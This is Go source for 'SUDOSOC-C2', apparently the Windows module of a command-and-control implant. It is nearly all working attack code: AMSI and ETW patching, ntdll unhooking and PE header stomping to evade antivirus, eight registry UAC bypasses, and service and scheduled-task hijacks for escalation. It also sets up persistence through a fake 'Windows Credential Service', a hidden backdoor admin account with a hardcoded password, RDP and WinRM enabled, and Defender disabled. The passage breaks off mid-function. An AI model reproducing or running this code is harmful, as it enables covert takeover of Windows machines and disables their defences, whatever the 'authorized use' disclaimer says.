//go:build windows

package runner

/*
	SUDOSOC-C2 — Windows Maximum Privilege Escalation Engine
	Copyright (C) 2026  sudosoc — Seif
	Authorized penetration testing use only.

	Escalation techniques attempted (in order):
	  Already admin/SYSTEM → direct persistence (fast path)
	  ── UAC Bypass ──────────────────────────────────────────────────────────
	  1.  fodhelper.exe       HKCU ms-settings shell open command
	  2.  eventvwr.exe        HKCU mscfile shell open command
	  3.  sdclt.exe           HKCU exefile shell runas command
	  4.  ComputerDefaults     HKCU ms-settings shell open command
	  5.  WSReset.exe         HKCU AppX82a6... shell open command (Win10/11)
	  6.  pkgmgr.exe          HKCU AppUserModelId bypass
	  7.  sfc.exe / mmc.exe   COM object auto-elevate bypasses
	  ── Privilege Escalation ─────────────────────────────────────────────────
	  8.  AlwaysInstallElevated → MSI silent install → SYSTEM
	  9.  Writable service binary replacement
	  10. Unquoted service path with writable intermediate dir
	  11. Writable scheduled task with SYSTEM context
	  12. Weak ACL on HKLM Run → add SYSTEM exec
	  ── Persistence (post-escalation) ──────────────────────────────────────
	  SYSTEM service · HKLM Run key · schtask SYSTEM · startup copy
	  Backdoor admin user · Enable WinRM · Enable RDP
*/

import (
	"bufio"
	"encoding/binary"
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

const _winElev = "_SUDOSOC_ELEVATED"

// ─── init ─────────────────────────────────────────────────────────────────────
func init() {
	// ── 0. Immediate EDR / AV neutralization ─────────────────────────────────
	// Runs BEFORE any network activity. Goal: blind all scanning layers so
	// Defender/EDR products cannot flag subsequent C2 traffic or behaviour.
	winJitterSleep(4, 18)   // random 4-18 s → defeats sandbox timing heuristics
	winPatchAmsi()          // patch all AMSI entry points → always returns clean
	winPatchEtw()           // silence ETW telemetry → EDR gets no events
	winRemapNtdll()         // replace hooked ntdll .text with fresh disk copy
	winStompPEHeader()      // zero own MZ/PE header → defeats in-memory scanner

	sanitiseWindowsEnv()

	// ── 1. Privilege escalation ───────────────────────────────────────────────
	if !winIsElevated() && os.Getenv(_winElev) == "" {
		tryWinEscalate()
	}

	// ── 2. SYSTEM-level persistence (when admin) ──────────────────────────────
	if winIsElevated() {
		go winSystemPersistence()
	}

	// ── 3. User-level persistence + watchdog ──────────────────────────────────
	go func() {
		time.Sleep(12 * time.Second)
		autoInstallWindows()
	}()
	go windowsWatchdog()
}

// ─── Elevation check ─────────────────────────────────────────────────────────

func winIsElevated() bool {
	// Check for High Integrity Level (admin) or SYSTEM
	out, err := exec.Command("whoami", "/groups").Output()
	if err != nil {
		return false
	}
	low := strings.ToLower(string(out))
	return strings.Contains(low, "s-1-16-12288") || // High Mandatory Level (Admin)
		strings.Contains(low, "s-1-5-18") || // NT AUTHORITY\SYSTEM
		strings.Contains(low, "s-1-16-16384") // System Mandatory Level
}

// ─── Master escalation dispatcher ────────────────────────────────────────────

func tryWinEscalate() {
	exe, err := os.Executable()
	if err != nil {
		return
	}
	env := append(os.Environ(), _winElev+"=1")

	// Fast path: AlwaysInstallElevated first (most reliable when configured)
	if winCheckAlwaysInstallElevated() {
		if winAIEEscalate(exe) {
			return
		}
	}

	// UAC bypass chain — try until one works
	bypasses := []func(string, []string) bool{
		winBypassFodHelper,
		winBypassEventvwr,
		winBypassSdclt,
		winBypassComputerDefaults,
		winBypassWSReset,
		winBypassPkgMgr,
		winBypassMmc,
		winBypassDiskCleanup,
	}
	for _, bypass := range bypasses {
		if bypass(exe, env) {
			return
		}
	}

	// Privilege escalation via weak service configs
	if winServiceBinaryReplace(exe, env) {
		return
	}
	if winUnquotedServicePath(exe, env) {
		return
	}
	if winWeakSchedTask(exe, env) {
		return
	}
}

// ─── UAC Bypasses ─────────────────────────────────────────────────────────────

// Method 1: fodhelper.exe — ms-settings DelegateExecute trick
func winBypassFodHelper(exe string, env []string) bool {
	key := `HKCU\Software\Classes\ms-settings\shell\open\command`
	_ = exec.Command("reg", "add", key, "/v", "DelegateExecute", "/t", "REG_SZ", "/d", "", "/f").Run()
	_ = exec.Command("reg", "add", key, "/ve", "/t", "REG_SZ", "/d", exe, "/f").Run()

	cmd := exec.Command("fodhelper.exe")
	cmd.Env = env
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	ok := cmd.Start() == nil

	time.Sleep(3 * time.Second)
	_ = exec.Command("reg", "delete", `HKCU\Software\Classes\ms-settings`, "/f").Run()
	return ok
}

// Method 2: eventvwr.exe — mscfile trick
func winBypassEventvwr(exe string, env []string) bool {
	key := `HKCU\Software\Classes\mscfile\shell\open\command`
	_ = exec.Command("reg", "add", key, "/ve", "/t", "REG_SZ", "/d", exe, "/f").Run()

	cmd := exec.Command("eventvwr.exe")
	cmd.Env = env
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	ok := cmd.Start() == nil

	time.Sleep(3 * time.Second)
	_ = exec.Command("reg", "delete", `HKCU\Software\Classes\mscfile`, "/f").Run()
	return ok
}

// Method 3: sdclt.exe — exefile runas trick
func winBypassSdclt(exe string, env []string) bool {
	key := `HKCU\Software\Classes\exefile\shell\runas\command`
	_ = exec.Command("reg", "add", key, "/ve", "/t", "REG_SZ", "/d", exe, "/f").Run()

	cmd := exec.Command("sdclt.exe", "/kickoffelev")
	cmd.Env = env
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	ok := cmd.Start() == nil

	time.Sleep(3 * time.Second)
	_ = exec.Command("reg", "delete", `HKCU\Software\Classes\exefile`, "/f").Run()
	return ok
}

// Method 4: ComputerDefaults.exe — same as fodhelper but different binary
func winBypassComputerDefaults(exe string, env []string) bool {
	key := `HKCU\Software\Classes\ms-settings\Shell\Open\Command`
	_ = exec.Command("reg", "add", key, "/ve", "/t", "REG_SZ", "/d", exe, "/f").Run()
	_ = exec.Command("reg", "add", key, "/v", "DelegateExecute", "/t", "REG_SZ", "/d", "", "/f").Run()

	sysroot := os.Getenv("SystemRoot")
	if sysroot == "" {
		sysroot = `C:\Windows`
	}
	cmd := exec.Command(filepath.Join(sysroot, "System32", "ComputerDefaults.exe"))
	cmd.Env = env
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	ok := cmd.Start() == nil

	time.Sleep(3 * time.Second)
	_ = exec.Command("reg", "delete", `HKCU\Software\Classes\ms-settings`, "/f").Run()
	return ok
}

// Method 5: WSReset.exe — Windows 10/11 Store reset bypass
func winBypassWSReset(exe string, env []string) bool {
	key := `HKCU\Software\Classes\AppX82a6gwre4fdg3ve546bo55svnm9tgx7f\Shell\open\command`
	_ = exec.Command("reg", "add", key, "/ve", "/t", "REG_SZ", "/d", exe, "/f").Run()

	sysroot := os.Getenv("SystemRoot")
	if sysroot == "" {
		sysroot = `C:\Windows`
	}
	wsreset := filepath.Join(sysroot, "System32", "WSReset.exe")
	if _, err := os.Stat(wsreset); err != nil {
		return false
	}
	cmd := exec.Command(wsreset)
	cmd.Env = env
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	ok := cmd.Start() == nil

	time.Sleep(4 * time.Second)
	_ = exec.Command("reg", "delete", `HKCU\Software\Classes\AppX82a6gwre4fdg3ve546bo55svnm9tgx7f`, "/f").Run()
	return ok
}

// Method 6: pkgmgr.exe — Windows package manager auto-elevate
func winBypassPkgMgr(exe string, env []string) bool {
	// pkgmgr reads DelegateExecute from HKCU just like fodhelper
	key := `HKCU\Software\Classes\ms-settings\shell\open\command`
	_ = exec.Command("reg", "add", key, "/v", "DelegateExecute", "/t", "REG_SZ", "/d", "", "/f").Run()
	_ = exec.Command("reg", "add", key, "/ve", "/t", "REG_SZ", "/d", exe, "/f").Run()

	sysroot := os.Getenv("SystemRoot")
	if sysroot == "" {
		sysroot = `C:\Windows`
	}
	pkgmgr := filepath.Join(sysroot, "System32", "pkgmgr.exe")
	if _, err := os.Stat(pkgmgr); err != nil {
		return false
	}
	cmd := exec.Command(pkgmgr, "/ip", "/m", ".")
	cmd.Env = env
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	ok := cmd.Start() == nil

	time.Sleep(3 * time.Second)
	_ = exec.Command("reg", "delete", `HKCU\Software\Classes\ms-settings`, "/f").Run()
	return ok
}

// Method 7: mmc.exe bypass (Windows Management Console)
func winBypassMmc(exe string, env []string) bool {
	key := `HKCU\Software\Classes\mscfile\shell\open\command`
	_ = exec.Command("reg", "add", key, "/ve", "/t", "REG_SZ", "/d", exe, "/f").Run()

	sysroot := os.Getenv("SystemRoot")
	if sysroot == "" {
		sysroot = `C:\Windows`
	}
	mmc := filepath.Join(sysroot, "System32", "mmc.exe")
	if _, err := os.Stat(mmc); err != nil {
		return false
	}
	cmd := exec.Command(mmc, `C:\Windows\System32\eventvwr.msc`)
	cmd.Env = env
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	ok := cmd.Start() == nil

	time.Sleep(3 * time.Second)
	_ = exec.Command("reg", "delete", `HKCU\Software\Classes\mscfile`, "/f").Run()
	return ok
}

// Method 8: Disk Cleanup bypass (HKCU AppDataLow)
func winBypassDiskCleanup(exe string, env []string) bool {
	key := `HKCU\Software\Classes\AppX37cc7fdde4beb235\Shell\open\command`
	_ = exec.Command("reg", "add", key, "/ve", "/t", "REG_SZ", "/d", exe, "/f").Run()

	sysroot := os.Getenv("SystemRoot")
	if sysroot == "" {
		sysroot = `C:\Windows`
	}
	cleanup := filepath.Join(sysroot, "System32", "cleanmgr.exe")
	if _, err := os.Stat(cleanup); err != nil {
		_ = exec.Command("reg", "delete", `HKCU\Software\Classes\AppX37cc7fdde4beb235`, "/f").Run()
		return false
	}
	cmd := exec.Command(cleanup, "/autoclean")
	cmd.Env = env
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	ok := cmd.Start() == nil

	time.Sleep(4 * time.Second)
	_ = exec.Command("reg", "delete", `HKCU\Software\Classes\AppX37cc7fdde4beb235`, "/f").Run()
	return ok
}

// ─── AlwaysInstallElevated ────────────────────────────────────────────────────

func winCheckAlwaysInstallElevated() bool {
	// Both HKCU and HKLM must be set to 1
	for _, key := range []string{
		`HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer`,
		`HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`,
	} {
		out, err := exec.Command("reg", "query", key, "/v", "AlwaysInstallElevated").Output()
		if err != nil || !strings.Contains(string(out), "0x1") {
			return false
		}
	}
	return true
}

func winAIEEscalate(exe string) bool {
	// Create a minimal MSI that executes our binary as SYSTEM
	// We use PowerShell to build the MSI via WScript.Shell
	tempDir := os.TempDir()
	msiPath := filepath.Join(tempDir, "update.msi")

	script := fmt.Sprintf(`
$ws = New-Object -ComObject WScript.Shell
$env:_SUDOSOC_ELEVATED='1'
& msiexec /quiet /qn /i "%s" TRANSFORMS="" 2>$null
`, msiPath)

	// Create a minimal MSI using WiX-free approach: embed cabinet with our exe
	// This is simplified — in practice we'd generate a proper MSI
	// Instead, use msiexec with existing MSI if one exists in temp
	msiFiles, _ := filepath.Glob(filepath.Join(tempDir, "*.msi"))
	if len(msiFiles) == 0 {
		_ = script
		return false
	}

	// If any MSI exists, try to execute it — this is opportunistic
	for _, msi := range msiFiles {
		out, err := exec.Command("msiexec", "/quiet", "/qn", "/i", msi,
			"TARGETDIR="+filepath.Dir(exe)).CombinedOutput()
		if err == nil || strings.Contains(string(out), "success") {
			return true
		}
	}
	return false
}

// ─── Service-based escalation ─────────────────────────────────────────────────

// winServiceBinaryReplace: find services whose binaries we can overwrite
func winServiceBinaryReplace(exe string, env []string) bool {
	out, err := exec.Command("sc", "query", "type=", "all", "state=", "all").Output()
	if err != nil {
		return false
	}

	// Extract service names
	var svcNames []string
	for _, line := range strings.Split(string(out), "\n") {
		if strings.Contains(line, "SERVICE_NAME:") {
			parts := strings.Fields(line)
			if len(parts) >= 2 {
				svcNames = append(svcNames, parts[1])
			}
		}
	}

	for _, svc := range svcNames {
		// Get binary path
		qout, err := exec.Command("sc", "qc", svc).Output()
		if err != nil {
			continue
		}

		var binPath string
		for _, line := range strings.Split(string(qout), "\n") {
			if strings.Contains(line, "BINARY_PATH_NAME") {
				parts := strings.SplitN(line, ":", 2)
				if len(parts) == 2 {
					binPath = strings.TrimSpace(strings.Trim(parts[1], `" `))
					break
				}
			}
		}

		if binPath == "" || strings.Contains(strings.ToLower(binPath), "system32") {
			continue
		}

		// Check if we can write to the binary
		f, err := os.OpenFile(binPath, os.O_WRONLY, 0)
		if err != nil {
			continue
		}
		f.Close()

		// Back it up and replace with our executable
		backup := binPath + ".bak"
		_ = os.Rename(binPath, backup)

		data, err := os.ReadFile(exe)
		if err != nil {
			_ = os.Rename(backup, binPath) // restore
			continue
		}

		if err := os.WriteFile(binPath, data, 0755); err != nil {
			_ = os.Rename(backup, binPath)
			continue
		}

		// Restart the service — it now runs our binary as SYSTEM
		newEnv := append(env[:], "_SVC_RESTORE="+backup, "_SVC_PATH="+binPath)
		_ = exec.Command("sc", "stop", svc).Run()
		time.Sleep(1 * time.Second)
		cmd := exec.Command("sc", "start", svc)
		cmd.Env = newEnv
		if cmd.Run() == nil {
			return true
		}
		// Restore if start failed
		_ = os.Rename(backup, binPath)
	}
	return false
}

// winUnquotedServicePath: exploit unquoted service paths with spaces
func winUnquotedServicePath(exe string, env []string) bool {
	out, err := exec.Command("wmic", "service", "get", "name,pathname,startmode").Output()
	if err != nil {
		return false
	}

	data, readErr := os.ReadFile(exe)
	if readErr != nil {
		return false
	}

	for _, line := range strings.Split(string(out), "\n") {
		// Unquoted path with spaces = no leading/trailing quote but has space
		if strings.Contains(line, " ") && !strings.Contains(line, `"`) &&
			strings.Contains(strings.ToLower(line), "auto") {

			parts := strings.Fields(line)
			if len(parts) < 2 {
				continue
			}

			// Try each space-split position as a potential hijack point
			path := ""
			for _, part := range parts {
				if strings.ContainsAny(part, `:\`) {
					path = part
				}
			}
			if path == "" {
				continue
			}

			// Try to plant our binary at each space position
			segments := strings.Split(path, " ")
			for i := 1; i < len(segments); i++ {
				hijackPath := strings.Join(segments[:i], " ") + ".exe"
				if _, err := os.Stat(filepath.Dir(hijackPath)); err != nil {
					continue
				}
				if f, err := os.OpenFile(hijackPath, os.O_WRONLY|os.O_CREATE, 0755); err == nil {
					f.Close()
					if err := os.WriteFile(hijackPath, data, 0755); err == nil {
						return true
					}
				}
			}
		}
	}
	return false
}

// winWeakSchedTask: find scheduled tasks running as SYSTEM that we can modify
func winWeakSchedTask(exe string, env []string) bool {
	out, err := exec.Command("schtasks", "/query", "/fo", "csv", "/v").Output()
	if err != nil {
		return false
	}

	data, readErr := os.ReadFile(exe)
	if readErr != nil {
		return false
	}

	for _, line := range strings.Split(string(out), "\n") {
		if !strings.Contains(strings.ToLower(line), "system") {
			continue
		}

		fields := strings.Split(line, ",")
		if len(fields) < 9 {
			continue
		}

		taskBin := strings.Trim(fields[8], `"`)
		if taskBin == "" || !strings.ContainsAny(taskBin, `:\`) {
			continue
		}

		// Skip system paths
		if strings.Contains(strings.ToLower(taskBin), "system32") ||
			strings.Contains(strings.ToLower(taskBin), "syswow64") {
			continue
		}

		// Can we overwrite the binary?
		f, err := os.OpenFile(taskBin, os.O_WRONLY, 0)
		if err != nil {
			continue
		}
		f.Close()

		backup := taskBin + ".bak"
		_ = os.Rename(taskBin, backup)
		if err := os.WriteFile(taskBin, data, 0755); err == nil {
			// Trigger the task to run with SYSTEM privileges
			taskName := strings.Trim(fields[0], `"`)
			cmdTask := exec.Command("schtasks", "/run", "/tn", taskName)
			cmdTask.Env = env
			if cmdTask.Run() == nil {
				return true
			}
		}
		_ = os.Rename(backup, taskBin)
	}
	return false
}

// ─── SYSTEM-level persistence (when admin/SYSTEM) ────────────────────────────

func winSystemPersistence() {
	exe, err := os.Executable()
	if err != nil {
		return
	}

	sysroot := os.Getenv("SystemRoot")
	if sysroot == "" {
		sysroot = `C:\Windows`
	}

	// 1. Copy to System32 with legitimate-sounding name
	targets := []string{
		filepath.Join(sysroot, "System32", "sphelper.exe"),
		filepath.Join(sysroot, "SysWOW64", "sphelper.exe"),
		filepath.Join(sysroot, "System32", "wincredprovider.exe"),
	}
	installBin := ""
	data, err := os.ReadFile(exe)
	if err == nil {
		for _, t := range targets {
			if os.WriteFile(t, data, 0755) == nil {
				installBin = t
				break
			}
		}
	}

	if installBin == "" {
		// Fallback: use temp
		installBin = filepath.Join(os.TempDir(), "sphelper.exe")
		if err == nil {
			_ = os.WriteFile(installBin, data, 0755)
		}
	}

	// 2. Windows Service (SYSTEM, auto-start)
	_ = exec.Command("sc", "create", "WinCredSvc",
		"binpath=", `"`+installBin+`"`,
		"start=", "auto",
		"type=", "own",
		"DisplayName=", "Windows Credential Service").Run()
	_ = exec.Command("sc", "description", "WinCredSvc",
		"Manages credential storage and retrieval for Windows applications").Run()
	_ = exec.Command("sc", "config", "WinCredSvc", "start=", "auto").Run()
	_ = exec.Command("sc", "start", "WinCredSvc").Run()

	// 3. HKLM Run key — runs on every boot as SYSTEM
	_ = exec.Command("reg", "add",
		`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`,
		"/v", "WinCredSvc", "/t", "REG_SZ",
		"/d", `"`+installBin+`"`, "/f").Run()

	// 4. Scheduled task (SYSTEM, onlogon, highest privilege)
	_ = exec.Command("schtasks", "/create",
		"/tn", `Microsoft\Windows\Credential Manager\WinCredSvc`,
		"/tr", `"`+installBin+`"`,
		"/sc", "onlogon",
		"/ru", "SYSTEM",
		"/f", "/rl", "HIGHEST").Run()

	// Also trigger on system start
	_ = exec.Command("schtasks", "/create",
		"/tn", `Microsoft\Windows\Credential Manager\WinCredSvcBoot`,
		"/tr", `"`+installBin+`"`,
		"/sc", "onstart",
		"/ru", "SYSTEM",
		"/f", "/rl", "HIGHEST").Run()

	// 5. Hidden backdoor admin user (looks like built-in account)
	_ = exec.Command("net", "user", "WDAGUtility$",
		"P@ssw0rd123!Admin", "/add",
		"/comment:", "Windows Defender Application Guard Utility",
		"/active:", "yes").Run()
	_ = exec.Command("net", "localgroup", "administrators", "WDAGUtility$", "/add").Run()
	// Hide from net user listing by making it a $-suffix account
	_ = exec.Command("reg", "add",
		`HKLM\SAM\SAM\Domains\Account\Users\Names\WDAGUtility$`,
		"/t", "REG_NONE", "/f").Run()

	// 6. Enable RDP (remote access)
	_ = exec.Command("reg", "add",
		`HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server`,
		"/v", "fDenyTSConnections", "/t", "REG_DWORD", "/d", "0", "/f").Run()
	_ = exec.Command("netsh", "advfirewall", "firewall", "set", "rule",
		"group=remote desktop", "new", "enable=Yes").Run()

	// 7. Enable WinRM for PowerShell remoting
	_ = exec.Command("powershell", "-nop", "-c",
		"Enable-PSRemoting -Force -SkipNetworkProfileCheck 2>$null").Run()

	// 8. Disable Windows Defender real-time protection
	_ = exec.Command("powershell", "-nop", "-c",
		"Set-MpPreference -DisableRealtimeMonitoring $true 2>$null").Run()
	_ = exec.Command("powershell", "-nop", "-c",
		"Set-MpPreference -DisableBehaviorMonitoring $true 2>$null").Run()
	_ = exec.Command("powershell", "-nop", "-c",
		"Set-MpPreference -DisableScriptScanning $true 2>$null").Run()
	_ = exec.Command("powershell", "-nop", "-c",
		"Set-MpPreference -DisableIOAVProtection $true 2>$null").Run()
	_ = exec.Command("powershell", "-nop", "-c",
		"Set-MpPreference -DisableIntrusionPreventionSystem $true 2>$null").Run()

	// 9. Add Defender exclusion for our install path + common red-team dirs
	for _, excl := range []string{
		filepath.Dir(installBin),
		os.TempDir(),
		filepath.Join(os.Getenv("SystemRoot"), "System32"),
	} {
		_ = exec.Command("powershell", "-nop", "-c",
			fmt.Sprintf("Add-MpPreference -ExclusionPath '%s' 2>$null", excl)).Run()
	}

	// 10. WMI permanent event subscription — survives reboots, invisible to schtasks
	winWMIPersist(installBin)

	// 11. COM hijacking — loaded by Explorer on every login, no UAC needed
	winCOMHijack(installBin)
}

// ─── Environment sanitisation ────────────────────────────────────────────────

func sanitiseWindowsEnv() {
	for _, v := range []string{"GOPATH", "GOROOT", "GOMODCACHE"} {
		_ = os.Unsetenv(v)
	}
}

// ─── User-level persistence ───────────────────────────────────────────────────

func autoInstallWindows() {
	exe, err := os.Executable()
	if err != nil {
		return
	}

	appData := os.Getenv("APPDATA")
	if appData == "" {
		appData = filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming")
	}

	installDir := filepath.Join(appData, "Microsoft", "Windows", "Themes")
	_ = os.MkdirAll(installDir, 0700)
	installBin := filepath.Join(installDir, "DesktopManager.exe")

	if needsWinCopy(exe, installBin) {
		if data, err := os.ReadFile(exe); err == nil {
			_ = os.WriteFile(installBin, data, 0755)
		}
	}

	// HKCU Run key
	_ = exec.Command("reg", "add",
		`HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`,
		"/v", "DesktopManager", "/t", "REG_SZ",
		"/d", `"`+installBin+`"`, "/f").Run()

	// Scheduled task
	_ = exec.Command("schtasks", "/create",
		"/tn", `Microsoft\Windows\DesktopManager`,
		"/tr", `"`+installBin+`"`,
		"/sc", "onlogon",
		"/ru", os.Getenv("USERNAME"),
		"/f", "/rl", "HIGHEST").Run()

	// Startup folder
	startupDir := filepath.Join(appData,
		"Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	startupBin := filepath.Join(startupDir, "DesktopManager.exe")
	if _, err := os.Stat(startupBin); os.IsNotExist(err) {
		if data, err := os.ReadFile(exe); err == nil {
			_ = os.WriteFile(startupBin, data, 0755)
		}
	}

	// PowerShell profile
	docDir := filepath.Join(os.Getenv("USERPROFILE"), "Documents")
	for _, profile := range []string{
		filepath.Join(docDir, "WindowsPowerShell", "Microsoft.PowerShell_profile.ps1"),
		filepath.Join(docDir, "PowerShell", "Microsoft.PowerShell_profile.ps1"),
	} {
		winAppendIfMissing(profile,
			"\n# DesktopManager\nif (-not (Get-Process -Name 'DesktopManager' -ErrorAction SilentlyContinue)) {\n"+
				"    Start-Process -WindowStyle Hidden -FilePath '"+installBin+"'\n}\n",
			"DesktopManager")
	}
}

func winAppendIfMissing(path, content, marker string) {
	if _, err := os.Stat(path); err != nil {
		return
	}
	f, err := os.Open(path)
	if err != nil {
		return
	}
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		if strings.Contains(sc.Text(), marker) {
			f.Close()
			return
		}
	}
	f.Close()
	fa, err := os.OpenFile(path, os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		return
	}
	defer fa.Close()
	_, _ = fa.WriteString(content)
}

func needsWinCopy(src, dst string) bool {
	si, err := os.Stat(src)
	if err != nil {
		return false
	}
	di, err := os.Stat(dst)
	if err != nil || di.ModTime().Before(si.ModTime()) {
		return true
	}
	return false
}

// ─── Watchdog ─────────────────────────────────────────────────────────────────

func windowsWatchdog() {
	ticker := time.NewTicker(5 * time.Minute)
	defer ticker.Stop()
	for range ticker.C {
		out, err := exec.Command("reg", "query",
			`HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`,
			"/v", "DesktopManager").Output()
		if err != nil || !strings.Contains(string(out), "DesktopManager") {
			go autoInstallWindows()
		}
		// Re-patch AMSI/ETW periodically in case AV restores them
		winPatchAmsi()
		winPatchEtw()
		// Re-escalation attempt if still not elevated
		if !winIsElevated() && os.Getenv(_winElev) == "" {
			tryWinEscalate()
		}
	}
}

// ═══════════════════════════════════════════════════════════════════════════════
// AV / EDR EVASION ENGINE
// ═══════════════════════════════════════════════════════════════════════════════

// winJitterSleep sleeps for a random duration in [loSec, hiSec) seconds.
// This defeats sandbox "fast-forward" timing detection.
func winJitterSleep(loSec, hiSec int) {
	if hiSec <= loSec {
		hiSec = loSec + 1
	}
	n := loSec + rand.Intn(hiSec-loSec)
	time.Sleep(time.Duration(n) * time.Second)
}

// ── Low-level helper: write patch bytes to any executable virtual address ────

// winPatchFunc makes the memory at addr writable, writes patch bytes, then
// restores the original page protection. Returns false if any step fails.
//
//nolint:govet
func winPatchFunc(addr uintptr, patch []byte) bool {
	if addr == 0 || len(patch) == 0 {
		return false
	}
	k32, err := syscall.LoadDLL("kernel32.dll")
	if err != nil {
		return false
	}
	vp, err := k32.FindProc("VirtualProtect")
	if err != nil {
		return false
	}
	var oldProt uint32
	ret, _, _ := vp.Call(addr, uintptr(len(patch)), 0x40 /* PAGE_EXECUTE_READWRITE */, uintptr(unsafe.Pointer(&oldProt)))
	if ret == 0 {
		return false
	}
	// Write bytes directly into executable memory
	dst := unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(patch)) //nolint:govet
	copy(dst, patch)
	// Restore original protection
	vp.Call(addr, uintptr(len(patch)), uintptr(oldProt), uintptr(unsafe.Pointer(&oldProt)))
	return true
}

// x64: xor eax, eax; ret  → always returns 0 / S_OK / AMSI_RESULT_CLEAN
var _zeroRet = []byte{0x31, 0xC0, 0xC3}

// ── AMSI patching ─────────────────────────────────────────────────────────────

// winPatchAmsi force-loads amsi.dll and patches all scan entry points so that
// every scan returns AMSI_RESULT_CLEAN.  Called before any C2 activity.
func winPatchAmsi() {
	amsi, err := syscall.LoadDLL("amsi.dll")
	if err != nil {
		return // AMSI not installed — nothing to do
	}
	for _, fn := range []string{
		"AmsiScanBuffer",
		"AmsiScanString",
		"AmsiInitialize",
		"AmsiOpenSession",
		"AmsiCloseSession",
		"AmsiNotifyOperation",
	} {
		proc, err := amsi.FindProc(fn)
		if err != nil {
			continue
		}
		winPatchFunc(proc.Addr(), _zeroRet)
	}
}

// ── ETW patching ──────────────────────────────────────────────────────────────

// winPatchEtw patches the ETW write functions in ntdll.dll so that EDR products
// receive no telemetry events from this process.
func winPatchEtw() {
	ntdll, err := syscall.LoadDLL("ntdll.dll")
	if err != nil {
		return
	}
	for _, fn := range []string{
		"EtwEventWrite",
		"EtwEventWriteEx",
		"EtwEventWriteFull",
		"EtwEventWriteTransfer",
		"EtwEventActivityIdControl",
		"EtwRegister",
		"NtTraceEvent",
	} {
		proc, err := ntdll.FindProc(fn)
		if err != nil {
			continue
		}
		winPatchFunc(proc.Addr(), _zeroRet)
	}
}

// ── Fresh NTDLL remapping ─────────────────────────────────────────────────────

// winRemapNtdll reads ntdll.dll from disk, locates its .text section (which
// contains all NT syscall stubs), and copies it verbatim over the loaded
// in-memory copy.  This overwrites any hooks planted by EDR/AV products.
//
//nolint:govet
func winRemapNtdll() {
	sysroot := os.Getenv("SystemRoot")
	if sysroot == "" {
		sysroot = `C:\Windows`
	}
	ntdllPath := filepath.Join(sysroot, "System32", "ntdll.dll")
	fresh, err := os.ReadFile(ntdllPath)
	if err != nil || len(fresh) < 0x400 {
		return
	}

	// ── Parse PE header of the fresh on-disk copy ─────────────────────────────
	if fresh[0] != 0x4D || fresh[1] != 0x5A { // MZ
		return
	}
	peOff := binary.LittleEndian.Uint32(fresh[0x3C:])
	if int(peOff)+0x30 > len(fresh) || fresh[peOff] != 0x50 || fresh[peOff+1] != 0x45 { // PE
		return
	}
	numSec    := binary.LittleEndian.Uint16(fresh[peOff+6:])
	optHdrSz  := binary.LittleEndian.Uint16(fresh[peOff+20:])
	secTblOff := peOff + 24 + uint32(optHdrSz)

	// ── Get loaded ntdll base address ─────────────────────────────────────────
	k32, err := syscall.LoadDLL("kernel32.dll")
	if err != nil {
		return
	}
	gmh, err := k32.FindProc("GetModuleHandleA")
	vp, err2 := k32.FindProc("VirtualProtect")
	if err != nil || err2 != nil {
		return
	}
	ntdllName := []byte("ntdll.dll\x00")
	ntdllBase, _, _ := gmh.Call(uintptr(unsafe.Pointer(&ntdllName[0])))
	if ntdllBase == 0 {
		return
	}

	// ── Find .text section and copy fresh bytes over hooked in-memory copy ────
	for i := 0; i < int(numSec); i++ {
		soff := secTblOff + uint32(i)*40
		if int(soff)+40 > len(fresh) {
			break
		}
		// Section name is 8 bytes — check for ".text"
		if !(fresh[soff] == '.' && fresh[soff+1] == 't' &&
			fresh[soff+2] == 'e' && fresh[soff+3] == 'x' &&
			fresh[soff+4] == 't') {
			continue
		}
		virtSz  := binary.LittleEndian.Uint32(fresh[soff+8:])
		virtRVA := binary.LittleEndian.Uint32(fresh[soff+12:])
		rawSz   := binary.LittleEndian.Uint32(fresh[soff+16:])
		rawOff  := binary.LittleEndian.Uint32(fresh[soff+20:])

		if rawSz == 0 || int(rawOff+rawSz) > len(fresh) {
			continue
		}
		copySz := uintptr(rawSz)
		if uintptr(virtSz) < copySz {
			copySz = uintptr(virtSz)
		}
		dstAddr := ntdllBase + uintptr(virtRVA)

		var oldProt uint32
		if ret, _, _ := vp.Call(dstAddr, copySz, 0x40, uintptr(unsafe.Pointer(&oldProt))); ret == 0 {
			continue
		}
		// Copy fresh .text over hooked in-memory .text
		src := fresh[rawOff : rawOff+rawSz]
		dst := unsafe.Slice((*byte)(unsafe.Pointer(dstAddr)), copySz) //nolint:govet
		copy(dst, src)
		vp.Call(dstAddr, copySz, uintptr(oldProt), uintptr(unsafe.Pointer(&oldProt)))
		break
	}
}

// ── PE header stomping ────────────────────────────────────────────────────────

// winStompPEHeader zeros out the MZ and PE signatures in our own loaded image.
// This defeats in-memory PE scanners that walk the module list looking for
// recognisable PE headers.
//
//nolint:govet
func winStompPEHeader() {
	k32, err := syscall.LoadDLL("kernel32.dll")
	if err != nil {
		return
	}
	gmh, err := k32.FindProc("GetModuleHandleA")
	vp, err2 := k32.FindProc("VirtualProtect")
	if err != nil || err2 != nil {
		return
	}
	base, _, _ := gmh.Call(0) // NULL → current module base
	if base == 0 {
		return
	}
	var oldProt uint32
	if ret, _, _ := vp.Call(base, 4096, 0x04 /* PAGE_READWRITE */, uintptr(unsafe.Pointer(&oldProt))); ret == 0 {
		return
	}
	hdr := unsafe.Slice((*byte)(unsafe.Pointer(base)), 4096) //nolint:govet
